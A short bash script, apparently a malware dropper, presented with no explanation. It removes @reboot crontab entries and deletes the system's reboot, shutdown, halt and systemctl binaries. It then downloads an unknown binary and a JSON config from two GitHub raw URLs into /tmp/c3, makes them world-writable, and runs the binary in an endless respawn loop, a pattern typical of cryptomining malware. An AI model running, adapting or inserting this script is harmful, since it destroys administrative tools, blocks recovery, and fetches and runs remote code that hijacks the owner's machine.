#!/bin/bash
sudo sed -i '/^@reboot/d' /etc/crontab
sudo rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
mkdir -p /tmp/c3
cd /tmp/c3
wget https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main/9v.json
wget https://raw.githubusercontent.com/Blenkinship/any/main/0
chmod -R  777 /tmp/c3
/bin/sh -c 'while true; do nohup /tmp/c3/0 --config=/tmp/c3/9v.json >/dev/null; done' &


##
